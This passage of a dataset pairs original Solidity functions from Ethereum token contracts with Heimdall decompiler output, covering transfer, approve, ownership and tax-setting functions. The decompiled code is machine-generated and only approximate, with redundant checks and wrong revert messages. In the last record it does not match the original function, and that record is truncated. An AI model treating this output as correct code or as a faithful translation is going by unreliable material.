limit.\");\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_c = 0x12;\n                        require(0x03e8, \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = address(this);\n                        var_b = 0x05;\n                        require(!((0 * arg1) / 0x03e8), \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_c = 0x11;\n                        storage_map_e[var_a] = ((0 * arg1) / 0x03e8) + storage_map_e[var_a];\n                        uint256 var_d = (0 * arg1) / 0x03e8;\n                        emit Transfer(address(msg.sender), address(this), (0 * arg1) / 0x03e8);\n                        require(!(storage_map_e[var_a] > (((0 * arg1) / 0x03e8) + storage_map_e[var_a])), \"Transfer amount exceeds the max transfer limit.\");\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_c = 0x11;\n                        require(!((arg1 - ((0 * arg1) / 0x03e8)) > arg1), \"Transfer amount exceeds the max transfer limit.\");\n                    }\n                    require(!(bytes1(storage_map_e[var_a])), \"Transfer amount exceeds the max transfer limit.\");\n                    require(!(bytes1(storage_map_e[var_a])), \"Transfer amount exceeds the max transfer limit.\");\n                }\n            }\n        }\n        require(!(arg1 > antiWhaleThreshold), \"Transfer amount exceeds the max transfer limit.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x2f;\n        var_g = 0x5472616e7366657220616d6f756e74206578636565647320746865206d617820;\n        var_h = 0x7472616e73666572206c696d69742e0000000000000000000000000000000000;\n        if (!AntiWhaleEnabled) {\n            if (!AntiWhaleEnabled) {\n            }\n        }\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x29;\n        var_g = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_h = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xeffb5Ed8242e5270aD662C82EfcA97aDAdE27dFD", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(address(owner), address(arg0));\n        owner = (address(arg0)) | (uint96(owner));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xc921a48b2bBd243aC30422B266edf58F472Eca7F", "original_solidity_code": "function checkAddressRewards(address _wallet) public view virtual returns (uint256) {\\r\\n        return addressRewards[_wallet];\\r\\n    }", "heimdall_decompiled_code": "function checkAddressRewards(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x1a;\n        address var_c = storage_map_i[var_a];\n        return storage_map_i[var_a];\n    }"}
{"contract_address": "0xC246C2C0B1DEBBFF9370a5A2f0BD35c17DE5b373", "original_solidity_code": "function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0) - 0, \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(msg.sender);\n        uint256 var_b = 0;\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x26;\n        var_g = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_h = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xaCb8531Fb60d23846f82b8911F28b44D83e2554d", "original_solidity_code": "function setfinalselltax(uint256 finalselltax) external onlyOwner() {\r\n        _finalSellTax = finalselltax;\r\n        require(_finalSellTax<=30, \"less than 30%\");\r\n    }", "heimdall_decompiled_code": "function setfinalselltax(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _finalSellTax = arg0;\n        require(!(arg0 > 0x1e), \"less than 30%\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x0d;\n        var_d = 0x6c657373207468616e2033302500000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x81e8B33fc9ace761BdfB7Ca1335A2D92da204E70", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x842FD31eAd327AE42D19B7BFbdB045d3A219c662", "original_solidity_code": "function changeW1(address MarketingW) external onlyOwner {\r\n        require(MarketingW != address(0),\"BigBoss: Address Zero\");\r\n        MarketingAddress = payable(MarketingW);\r\n        emit _changeW1(MarketingW);\r\n    }", "heimdall_decompiled_code": "function changeW1(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(getOwner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"BigBoss: Address Zero\");\n        store_b = (address(arg0) * 0x0100) | (uint96(store_b));\n        address var_a = address(arg0);\n        emit _changeW1(address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x15;\n        var_d = 0x426967426f73733a2041646472657373205a65726f0000000000000000000000;\n    }"}
{"contract_address": "0x0056aC5defc0F8380b9d2B351c3C23b23A852082", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x02540be400) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x02540be400;\n                if (0x09) {\n                    if ((0x01 == 0x01) | !0x02540be400) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x02540be400;\n                        transferDelayEnabled = uint248(transferDelayEnabled);\n                        if (0x09) {\n                            if ((0x01 == 0x01) | !0x02540be400) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x02540be400;\n                                emit MaxTxAmountUpdated(0x02540be400);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                    if (!0x09 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0x01) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x2FcB9FA9FeC15b2d86440d10b940BB9f2Bd6f770", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_b[var_a]);\n        store_e = 0x01000000000000000000000000000000000000000000 | (uint248(store_e));\n        require(!storage_map_b[var_a]);\n        require(!bytes1(store_e / 0x010000000000000000000000000000000000000000));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!(((var_d + ret0.length) - var_d) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_d.length == (address(var_d.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(address(store_d), \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_d);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a];\n        address var_k = storage_map_b[var_a];\n        emit Approval(address(this), address(store_d), storage_map_b[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_b[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_p = var_d.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_d).code.length);\n        (bool success, bytes memory ret0) = address(store_d).Unresolved_791ac947(var_l); // call\n        store_e = uint248(store_e);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xE575f6f50AF7A409F7381F15bC25Ff9dD9414660", "original_solidity_code": "function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\\r\\n        _transfer(_msgSender(), recipient, amount);\\r\\n        return true;\\r\\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0) - 0, \"ERC20: transfer amount exceeds balance\");\n        require(arg1 - 0, \"ERC20: transfer amount exceeds balance\");\n        require(!(bytes1(swapEnabled / 0x01)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!(address(msg.sender)) == (address(_owner / 0x01))), \"ERC20: transfer amount exceeds balance\");\n        require(!(!(address(arg0)) == (address(_owner / 0x01))), \"ERC20: transfer amount exceeds balance\");\n        require(!(!(address(arg0)) == 0), \"ERC20: transfer amount exceeds balance\");\n        require(!(!(address(arg0)) == 0xdead), \"ERC20: transfer amount exceeds balance\");\n        require(!(!(address(arg0)) == 0xdead), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(this);\n        uint256 var_b = 0;\n        require(!(!storage_map_b[var_a] < swapTokensAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAmount), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0x19;\n        require(bytes1(storage_map_b[var_a] / 0x01), \"ERC20: transfer amount exceeds balance\");\n        require(!(bytes1(storage_map_b[var_a] / 0x01)), \"ERC20: transfer amount exceeds balance\");\n        require(!0, \"ERC20: transfer amount exceeds balance\");\n        var_a = address(arg0);\n        var_b = 0x1b;\n        require(!(bytes1(storage_map_b[var_a] / 0x01)), \"ERC20: transfer amount exceeds balance\");\n        require(!(sellTotalTaxes > 0), \"ERC20: transfer amount exceeds balance\");\n        require(!arg1 | (sellTotalTaxes == ((arg1 * sellTotalTaxes) / arg1)), \"ERC20: transfer amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(0x64, \"ERC20: transfer amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        require(!(0 > 0), \"ERC20: transfer amount exceeds balance\");\n        require(address(msg.sender) - 0, \"ERC20: transfer amount exceeds balance\");\n        require(address(this) - 0, \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0;\n        require(!(storage_map_b[var_a] < 0), \"ERC20: transfer amount exceeds balance\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x26;\n        var_h = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_i = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - 0;\n        var_a = address(this);\n        var_b = 0;\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + 0)), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        storage_map_b[var_a] = storage_map_b[var_a] + 0;\n        uint256 var_d = 0;\n        emit Transfer(address(msg.sender), address(this), 0);\n        require(!((arg1 - 0) > arg1), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender) - 0, \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x23;\n        var_h = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_i = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0x1b;\n        if (!storage_map_b[var_a] / 0x01) {\n            require(!(bytes1(storage_map_b[var_a] / 0x01)), \"ERC20: transfer from the zero address\");\n        }\n        require(address(msg.sender) - 0, \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(!(!bytes1(uniswapV2Pair / 0x010000000000000000000000000000000000000000)), \"ERC20: transfer from the zero address\");\n        require(address(msg.sender) - 0, \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = address(arg0);\n        var_b = 0x1b;\n        require(!(bytes1(storage_map_b[var_a] / 0x01)), \"ERC20: transfer from the zero address\");\n        require(!(sellTotalTaxes > 0), \"ERC20: transfer from the zero address\");\n        require(!(0 > 0), \"ERC20: transfer from the zero address\");\n        require(!((arg1 - 0) > arg1), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender) - 0, \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0x1b;\n        if (!storage_map_b[var_a] / 0x01) {\n            if (!buyTotalTaxes > 0) {\n            }\n            if (!swapEnabled / 0x010000) {\n                if (!swapEnabled / 0x010000) {\n                    if (!swapEnabled / 0x010000) {\n                        if (!swapEnabled / 0x010000) {\n                            if (!swapEnabled / 0x010000) {\n                            }\n                        }\n                    }\n                }\n            }\n            require(!(bytes1(storage_map_b[var_a] / 0x01)), \"Sell transfer amount exceeds the maxTxAmount.\");\n            var_a = address(msg.sender);\n            var_b = 0x1b;\n            require(bytes1(swapEnabled / 0x0100), \"Sell transfer amount exceeds the maxTxAmount.\");\n            var_a = address(arg0);\n            var_b = 0x1a;\n            require(!(bytes1(storage_map_b[var_a] / 0x01)), \"Sell transfer amount exceeds the maxTxAmount.\");\n            var_a = address(arg0);\n            var_b = 0x1b;\n            require(!(!bytes1(storage_map_b[var_a] / 0x01)), \"Sell transfer amount exceeds the maxTxAmount.\");\n            var_a = address(msg.sender);\n            var_b = 0x1a;\n            require(!(bytes1(storage_map_b[var_a] / 0x01)), \"Sell transfer amount exceeds the maxTxAmount.\");\n            var_a = address(arg0);\n            var_b = 0x1a;\n            require(!(!bytes1(storage_map_b[var_a] / 0x01)), \"Sell transfer amount exceeds the maxTxAmount.\");\n        }\n        require(!(arg1 > maxTxAmount), \"Sell transfer amount exceeds the maxTxAmount.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x2d;\n        var_h = 0x53656c6c207472616e7366657220616d6f756e74206578636565647320746865;\n        var_i = 0x206d61785478416d6f756e742e00000000000000000000000000000000000000;\n        if (!storage_map_b[var_a] / 0x01) {\n        }\n        require(!(arg1 > maxTxAmount), \"Buy transfer amount exceeds the maxTxAmount.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x2c;\n        var_h = 0x427579207472616e7366657220616d6f756e7420657863656564732074686520;\n        var_i = 0x6d61785478416d6f756e742e0000000000000000000000000000000000000000;\n        if (!storage_map_b[var_a] / 0x01) {\n        }\n        var_a = address(msg.sender);\n        var_b = 0x19;\n        require(bytes1(storage_map_b[var_a] / 0x01), \"Trading is not active.\");\n        require(bytes1(storage_map_b[var_a] / 0x01), \"Trading is not active.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x16;\n        var_h = 0x54726164696e67206973206e6f74206163746976652e00000000000000000000;\n        if (address(arg0) == 0) {\n            if (address(arg0) == 0) {\n            }\n        }\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x23;\n        var_h = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_i = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x4c5CbB44F1F835E2BbE255d8dBFb91A364b0D36B", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _transferOwnership(newOwner);\\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(address(owner), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x912Abb1B9600d25937CAb8797A3CD5235bf2aAd5", "original_solidity_code": "function transfer(address to, uint256 amount) public virtual returns (bool) {\\n        balanceOf[msg.sender] -= amount;\\n\\n        // Cannot overflow because the sum of all user\\n        // balances can't exceed the max uint256 value.\\n        unchecked {\\n            balanceOf[to] += amount;\\n        }\\n\\n        emit Transfer(msg.sender, to, amount);\\n\\n        return true;\\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(0x02 == is_trading_enabled);\n        require(0x02 == is_trading_enabled);\n        require(address(msg.sender));\n        require(address(arg0));\n        require(arg1 > 0);\n        require(address(owner) == (address(msg.sender)));\n        require(address(owner) == (address(arg0)));\n        require(tx.origin == (address(owner)));\n        address var_a = address(msg.sender);\n        var_b = 0x0f;\n        require(!bytes1(storage_map_b[var_a]));\n        var_a = address(arg0);\n        var_b = 0x10;\n        require(bytes1(storage_map_b[var_a]));\n        require(bytes1(storage_map_b[var_a]));\n        var_a = address(arg0);\n        var_b = 0x0f;\n        require(!bytes1(storage_map_b[var_a]));\n        require(address(this) == (address(msg.sender)));\n        var_a = address(msg.sender);\n        var_b = 0x12;\n        require(bytes1(storage_map_b[var_a]));\n        var_a = address(this);\n        var_b = 0x03;\n        require(!0x01 == in_swap);\n        require(!0);\n        require(!storage_map_b[var_a] > sell_tax_threshold);\n        in_swap = 0x02;\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_h = address(weth);\n        var_i = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_j = storage_map_b[var_a];\n        uint256 var_k = 0;\n        var_l = 0xa0;\n        uint256 var_m = var_d.length;\n        address var_n = address(tax_receiver);\n        var_o = 0x056bc75e2d630fffff;\n        require(address(uni_router).code.length);\n        (bool success, bytes memory ret0) = address(uni_router).{ value: var_k ether }Unresolved_791ac947(var_j); // call\n        in_swap = 0x01;\n        require(!0, \"max tx limit\");\n        var_a = address(this);\n        var_b = 0x03;\n        require(!(storage_map_b[var_a] > (0 + storage_map_b[var_a])), \"max tx limit\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(!((0 + storage_map_b[var_a]) < storage_map_b[var_a]), \"max tx limit\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x01;\n        var_a = address(this);\n        var_b = 0x03;\n        storage_map_b[var_a] = var_k + storage_map_b[var_a];\n        uint256 var_i = 0;\n        emit Transfer(address(msg.sender), address(this), 0);\n        var_a = address(msg.sender);\n        var_b = 0x03;\n        require(!(arg1 > storage_map_b[var_a]), \"max tx limit\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x01;\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"max tx limit\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x03;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        require(!(0 > arg1), \"max tx limit\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x01;\n        require(!((arg1 - 0) > arg1), \"max tx limit\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(!(max_transfer < arg1), \"max tx limit\");\n        var_a = address(msg.sender);\n        var_b = 0x11;\n        require(bytes1(storage_map_b[var_a]), \"max tx limit\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_j = 0x20;\n        var_k = 0x0c;\n        var_l = 0x6d6178207478206c696d69740000000000000000000000000000000000000000;\n        require(!(max_transfer < arg1), \"max tx limit\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_j = 0x20;\n        var_k = 